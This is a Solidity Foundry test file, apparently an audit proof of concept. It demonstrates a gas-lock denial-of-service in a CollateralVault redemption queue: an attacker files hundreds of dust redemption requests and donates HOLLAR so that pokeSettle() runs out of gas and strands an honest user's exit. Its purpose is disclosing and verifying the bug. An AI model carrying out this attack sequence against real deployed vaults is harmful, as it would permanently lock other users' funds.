// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {CollateralVault} from "../src/CollateralVault.sol";
import {RoundingReserveFixture} from "./helpers/RoundingReserveFixture.sol";
import {SubLoop} from "../src/SubLoop.sol";
import {SyntheticToken} from "../src/SyntheticToken.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPool} from "./mocks/MockPool.sol";
import {DcaDispatch} from "../src/lib/DcaDispatch.sol";
import {MockDispatch} from "./mocks/MockDispatch.sol";

/// @notice PoC for the redemption-queue gas-lock finding
///         (`propeller-how-it-works.md` → "the redemption queue can be
///         permanently gas-locked", CollateralVault.sol:374-396, 448-489).
///
///         Attack:
///           1. `requestRedeem()` accepts arbitrarily many tiny requests.
///           2. `startUnwinds()` is bounded, but `pokeSettle()` iterates EVERY
///              funded request from `queueHead` to `queueUnwind` in ONE
///              transaction and only persists `queueHead` after the loop.
///           3. The attacker splits a small holding into hundreds of dust
///              requests, waits out the 12h delay, starts them, and donates
///              enough HOLLAR that every dust request is fully settleable —
///              so the loop never hits the `else break` early-exit.
///           4. Once the funded span costs more than block gas, `pokeSettle()`
///              reverts by out-of-gas. Because the revert rolls back the whole
///              transaction, `queueHead` NEVER advances: no call can make
///              partial progress, at any gas price, forever. Honest exits
///              queued behind the spam are bricked until a contract upgrade.
///
///         This test proves steps 3-4: it measures per-request settle cost,
///         shows the funded span exceeds a 30M-gas block budget, and shows a
///         gas-capped `pokeSettle` reverts with ZERO progress — repeatedly.
contract SettleGasLockPocTest is Test {
    MockERC20 eth;
    MockERC20 aEth;
    MockERC20 ethDebt;
    MockERC20 hollar;
    MockERC20 aHollar;
    MockERC20 hollarDebt;
    MockERC20 prime;
    MockERC20 aPrime;
    MockERC20 primeDebt;
    MockERC20 aSynth;
    MockERC20 synthDebt;

    MockPool pool;
    SyntheticToken synth;
    SubLoop loop;
    CollateralVault vault;

    address attacker = makeAddr("attacker");
    address honest = makeAddr("honest");

    /// Conservative reference block budget (Ethereum-style 30M). Hydration's
    /// EVM block is weight-capped; the exact number only changes HOW MANY dust
    /// requests the attack needs, not whether it works — settle cost grows
    /// linearly with the funded queue span, requests cost the attacker ~nothing.
    uint256 constant BLOCK_GAS_LIMIT = 30_000_000;
    uint256 constant DUST_REQUESTS = 400;

    function setUp() public {
        eth = new MockERC20("ETH", "ETH", 18);
        aEth = new MockERC20("aETH", "aETH", 18);
        ethDebt = new MockERC20("dETH", "dETH", 18);
        hollar = new MockERC20("HOLLAR", "HOLLAR", 18);
        aHollar = new MockERC20("aHOLLAR", "aHOLLAR", 18);
        hollarDebt = new MockERC20("dHOLLAR", "dHOLLAR", 18);
        prime = new MockERC20("PRIME", "PRIME", 6);
        aPrime = new MockERC20("aPRIME", "aPRIME", 6);
        primeDebt = new MockERC20("dPRIME", "dPRIME", 6);
        synth = new SyntheticToken("Propeller Synthetic", "psHOLLAR", address(this));
        aSynth = new MockERC20("aSYNTH", "aSYNTH", 18);
        synthDebt = new MockERC20("dSYNTH", "dSYNTH", 18);

        pool = new MockPool();
        pool.initReserve(address(eth), address(aEth), address(ethDebt), 8500, 7500, 18, 3_000e18);
        pool.initReserve(address(hollar), address(aHollar), address(hollarDebt), 0, 0, 18, 1e18);
        pool.initReserve(address(prime), address(aPrime), address(primeDebt), 8800, 8500, 6, 1e18);
        pool.initReserve(address(synth), address(aSynth), address(synthDebt), 9800, 100, 18, 1e18);

        loop = SubLoop(
            address(
                new ERC1967Proxy(
                    address(new SubLoop()),
                    abi.encodeCall(
                        SubLoop.initialize,
                        (address(pool), address(hollar), address(prime), address(aPrime), 1.05e18, 1.10e18, address(this))
                    )
                )
            )
        );

        vault = CollateralVault(
            address(
                new ERC1967Proxy(
                    address(new CollateralVault()),
                    abi.encodeCall(
                        CollateralVault.initialize,
                        (
                            "Propeller ETH",
                            "pETH",
                            address(eth),
                            address(pool),
                            address(loop),
                            address(0),
                            address(hollar),
                            address(synth),
                            address(aEth),
                            address(hollarDebt),
                            1_000e18,
                            address(this)
                        )
                    )
                )
            )
        );

        vm.etch(DcaDispatch.DISPATCH, address(new MockDispatch()).code);
        MockDispatch(payable(DcaDispatch.DISPATCH)).configure(address(pool), address(hollar), address(prime), 222, 1043);
        loop.configureDca(222, 43, 1043, 143, 10_000);

        synth.grantRole(synth.MINTER_ROLE(), address(vault));
        RoundingReserveFixture.fund(vault);
        loop.registerVault(address(vault));
        loop.setTranches(10_000_000e18, 10_000_000e6);
    }

    /// the first deposit is governance-only (DEAD_SHARES bootstrap)
    function _bootstrap() internal {
        eth.mint(address(this), 1e18);
        eth.approve(address(vault), 1e18);
        vault.deposit(1e18, address(this));
    }

    function _depositAs(address who, uint256 amount) internal returns (uint256 shares) {
        eth.mint(who, amount);
        vm.startPrank(who);
        eth.approve(address(vault), amount);
        shares = vault.deposit(amount, who);
        vm.stopPrank();
    }

    function _requestAs(address who, uint256 shares) internal returns (uint256 requestId) {
        vm.prank(who);
        requestId = vault.requestRedeem(shares, who);
    }

    function _unwindEverything() internal {
        for (uint256 i = 0; i < 2000; i++) {
            if (loop.unwindTargetEquity() == 0) break;
            loop.pokeRepay();
        }
    }

    /// ── control: a normal (small) queue settles fine within block gas ─────
    function test_control_smallQueueSettles() public {
        _bootstrap();
        _depositAs(honest, 1e18);
        for (uint256 i = 0; i < 40; i++) loop.pokeBorrow();

        uint256 shares = vault.balanceOf(honest);
        uint256 reqId = _requestAs(honest, shares);
        vm.warp(vm.getBlockTimestamp() + vault.withdrawalDelay());
        vault.startUnwinds(100);
        _unwindEverything();
        // cover unwind rounding dust so the debt slice repays in full
        hollar.mint(address(vault), 1e18);

        uint256 g = gasleft();
        vault.pokeSettle();
        uint256 used = g - gasleft();

        emit log_named_uint("control: gas to settle 1 request", used);
        assertLt(used, BLOCK_GAS_LIMIT, "control settles within block gas");
        assertEq(vault.queueHead(), reqId + 1, "control request fully settled");
    }

    /// ── PoC: dust-spam + donation permanently gas-locks pokeSettle ────────
    function test_poc_dustSpamGasLocksSettlement() public {
        // honest user enters first, attacker second (attacker's dust still
        // lands AHEAD of the honest exit in the queue — see request order below)
        _bootstrap();
        _depositAs(honest, 1e18);
        _depositAs(attacker, 0.4e18);
        for (uint256 i = 0; i < 40; i++) loop.pokeBorrow();

        // 1. attacker splits a small holding into hundreds of dust requests.
        //    Each is a real, non-zero redemption — there is no minimum size.
        uint256 atkShares = vault.balanceOf(attacker);
        uint256 dust = atkShares / DUST_REQUESTS;
        assertGt(vault.convertToAssets(dust), 0, "dust request is non-zero");
        for (uint256 i = 0; i < DUST_REQUESTS; i++) {
            _requestAs(attacker, dust);
        }
        // honest exit queued BEHIND the spam
        uint256 honestReq = _requestAs(honest, vault.balanceOf(honest));
        assertEq(honestReq, DUST_REQUESTS, "honest request sits behind 400 dust requests");

        // 2. wait out the cooldown, start everything (startUnwinds is bounded —
        //    the attacker batches it; this is NOT where the lock is)
        vm.warp(vm.getBlockTimestamp() + vault.withdrawalDelay());
        vault.startUnwinds(type(uint256).max);
        assertEq(vault.queueUnwind(), honestReq + 1, "all requests started");

        // 3. unwind the loop so freed HOLLAR is available to settle with
        _unwindEverything();

        // 4. attacker donates HOLLAR so EVERY dust request is fully settleable
        //    in one pokeSettle pass — the loop's `else break` never triggers.
        //    (Donation is cheap: dust debtShares are tiny, and the revert below
        //    rolls the donation straight back to the attacker every attempt.)
        uint256 queuedDebt = vault.totalQueuedDebt();
        uint256 shortfall = queuedDebt - hollar.balanceOf(address(vault)) - loop.freedOf(address(vault));
        hollar.mint(attacker, shortfall + 1e18);
        vm.prank(attacker);
        hollar.transfer(address(vault), shortfall + 1e18);

        // 5. measure what one full settle pass costs vs the block budget
        uint256 snap = vm.snapshot();
        uint256 g = gasleft();
        vault.pokeSettle();
        uint256 fullSettleGas = g - gasleft();
        emit log_named_uint("requests settled in one pass", DUST_REQUESTS + 1);
        emit log_named_uint("gas for full settle pass", fullSettleGas);
        emit log_named_uint("marginal gas per dust request", fullSettleGas / (DUST_REQUESTS + 1));
        assertGt(fullSettleGas, BLOCK_GAS_LIMIT, "settle pass exceeds the block gas budget");
        vm.revertTo(snap);

        // 6. THE LOCK: any pokeSettle within the block budget runs out of gas.
        //    The revert discards the whole transaction — queueHead never moves.
        uint256 headBefore = vault.queueHead();
        (bool ok1,) = address(vault).call{gas: BLOCK_GAS_LIMIT}(abi.encodeCall(CollateralVault.pokeSettle, ()));
        assertFalse(ok1, "pokeSettle cannot complete within block gas");
        assertEq(vault.queueHead(), headBefore, "ZERO progress: queueHead not checkpointed");

        // it never gets better: a second attempt fails identically (no partial
        // progress to build on, at any gas price, forever)
        (bool ok2,) = address(vault).call{gas: BLOCK_GAS_LIMIT}(abi.encodeCall(CollateralVault.pokeSettle, ()));
        assertFalse(ok2, "repeat attempt still out of gas");
        assertEq(vault.queueHead(), headBefore, "still zero progress");

        // 7. the honest exit behind the spam is bricked: nothing repaid,
        //    nothing claimable
        (, , , , , uint256 repaid, uint256 settled, , ) = vault.redemptions(honestReq);
        assertEq(repaid, 0, "honest request: no debt repaid");
        assertEq(settled, 0, "honest request: nothing to claim");
        vm.prank(honest);
        vm.expectRevert(); // NothingToClaim
        vault.claim(honestReq, honest);
    }
}
